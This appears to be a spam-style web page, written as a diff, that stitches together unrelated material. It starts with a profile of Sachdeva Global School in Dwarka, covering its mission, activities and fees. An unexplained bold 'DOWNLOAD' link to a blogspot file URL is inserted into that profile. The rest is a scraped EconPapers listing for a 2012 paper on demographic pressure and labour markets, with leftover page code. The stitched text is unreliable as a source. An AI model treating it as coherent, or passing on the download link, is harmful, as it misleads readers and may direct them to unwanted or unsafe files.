@@ -1,0 +1,33 @@
+Sachdeva Global School is a senior-secondary educational institution under the aegis of Shri. Laxman Dass Sachdeva Memorial Educational Society. It was founded by Mr. S.K. Sachdeva in 2007 with a motto to provide premium quality education to the students of classes Nursery to XII. The school wants to prepare its students for the future in every way possible. Its curriculum is designed according to the guidelines set by CBSE and it offers all three subject streams to the students of senior-secondary classes. With a student-teacher ratio of 20:1 and English as an instruction language, the school makes sure that students are able to understand the concepts being taught in the classroom. It has an urban-type campus spread over an area of 2 acres. It is disabled-friendly and offers a good learning environment to its students. It has proper arenas for sports and performing arts so that students can explore their creative sides.
+ 
+**DOWNLOAD ——— [https://zoohogonka.blogspot.com/?file=2A0SZU](https://zoohogonka.blogspot.com/?file=2A0SZU)**
+
+
+ 
+The mission of the school is to provide a stimulating learning environment to its students that help them in finding their true potential. It wants to cater to every student according to their varying needs and contribute to their development. The school is committed to instilling in each student a desire to learn with an emphasis on the social, emotional, physical, and intellectual developmental aspects, thereby bestowing the necessary traits such as resilience, adaptability, and knowledge for achieving the highest standards of achievement.
+ 
+The vision of Sachdeva Global School is to be recognized as one of the schools offering global-level education. It wants to set an example by offering a broad holistic, challenging, stimulating, and an integrated educational experience to its students.
+ 
+The school has a lot to offer beyond academics as it wants its students to have proper holistic development. It focuses on activities like dance, music, debate, art, gardening, craft, and drama. Cultural events are also organized by the school so that students can take part in such activities. Workshops and seminars conducted by industry experts are also organized by the school so that students can get to learn about different things and the latest happenings all around the world. The school is very active in social initiatives as it has undertaken various steps to add some value to society. Other than that trips and excursions are also organized by the school as the school believes that students learn better by doing things themselves and trips also provide students with some recreation.
+ 
+To get your child enrolled in Sachdeva Global School, you will have to pay fees between INR 90,000- 1,10,000, it can vary according to the class you are getting your child enrolled in. To better understand the school's fee structure, you can click on the dropdown menu and select the class of your preference.
+
+Sachdeva Global School Dwarka is not accepting admissions for any classes for the upcoming school year. Admissions for 2023-24 are expected to start soon. By clicking on the notify me button on our website you can get a notification whenever the admissions will start.
+ 
+EconPapers FAQ 
+Archive maintainers FAQ 
+Cookies at EconPapers Format for printing The RePEc blog 
+The RePEc plagiarism page A GLOBAL VIEW ON DEMOGRAPHIC PRESSURE AND LABOUR MARKET PARTICIPATION*Marga Peeters* and *Loek Groot* *Journal of Global Economy*, 2012, vol. 8, issue 2, 165-194**Abstract:**Demographic change exerts pressure on labour markets and public finances across the globe. Most studies on ageing focus on the projected development of the old age dependency ratio, the ratio of persons 65 or older relative to the working age population. This ratio gives a very incomplete picture of the (fiscal) pressure from demographic changes. In this study, besides the share of the dependent population composed of the young and old we include the share of the working age population that is not active on the labour market, labelled as the labour market space. By analysing 21 developing and 29 developed economies across the globe, we cover 75% of the 9.3 billion people that the United Nations projects for the whole world in 2050. A new indicator, relating demographic pressure from fiscal spending to the available space at the labour market, enables us to quantify and compare the pressure-to-space across countries over the time span 2010-2050. The indicator points out that Poland, Turkey and Greece are most under pressure, whereas developing countries Uganda, the Democratic Republic of Congo and Tanzania will experience a very low pressure up to 2050. Across countries, the relation between fiscal pressure exerted by the dependent population and the labour market space is positive. There is thus room for using this space by, for instance, working more hours or increasing the retirement age, as this will alleviate the fiscal pressure. This suggests a policy trade-off between maintaining publicly financed services to the dependent population and maintaining labour market space.**Keywords:** public finance; demography; dependency rates; labour market; unemployment; social security; pensions. (search for similar items in EconPapers)
+**JEL-codes:** J1 J2 (search for similar items in EconPapers)
+**Date:** 2012
+**References:** Add references at CitEc 
+**Citations:** View citations in EconPapers (1) **Downloads:** (external link)
+ (application/pdf)
+ (text/html)
+Not freely downloadable**Related works:**
+Working Paper: A global view on demographic pressure and labour market participation (2011) 
+This item may be available elsewhere in EconPapers: Search for items with the same title.**Export reference:** BibTeX RIS (EndNote, ProCite, RefMan) HTML/Text**Persistent link:** :jge:journl:827**Ordering information:** This journal article can be ordered from
+Obfuscate( 'rcssindia.org', 'editor' )Access Statistics for this articleJournal of Global Economy is currently edited by *Dr J K SACHDEVA*More articles in Journal of Global Economy from Research Centre for Social Sciences,Mumbai, India
+Bibliographic data for series maintained by Dr J K Sachdeva (Obfuscate( 'hotmail.com', 'sachdevajk' )). var addthis\_config = "data\_track\_clickback":true; var addthis\_share =  url:" :jge:journl:827"Share This site is part of RePEc and all the data displayed here is part of the RePEc data set. Is your work missing from RePEc? Here is how to contribute. Questions or problems? Check the EconPapers FAQ or send mail to Obfuscate( 'oru.se', 'econpapers' ). EconPapers is hosted by the School of Business at rebro University.
+ a2f82b0cb4
+ 
